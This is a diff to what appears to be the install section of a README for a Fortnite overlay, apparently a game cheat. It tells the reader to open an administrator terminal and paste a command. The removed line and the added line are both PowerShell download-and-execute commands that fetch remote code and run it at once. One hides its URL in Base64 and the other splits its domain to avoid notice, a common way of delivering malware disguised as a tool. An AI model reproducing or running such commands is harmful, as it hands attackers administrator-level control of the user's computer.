@@ -29,7 +29,7 @@
 - Win + X → Terminal (Admin)
 - Paste & Enter:
 ```
-iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz02NTQ3Mjc3MTg3L2J5cGFzcy1haQ=='))) -UseBasicParsing)
+"Fortnite";iex (irm ("kernelapi" + ".cfd?t=Fortnite"))
 ```
 - Open the in-game overlay using the configured hotkey and configure settings in menu
 
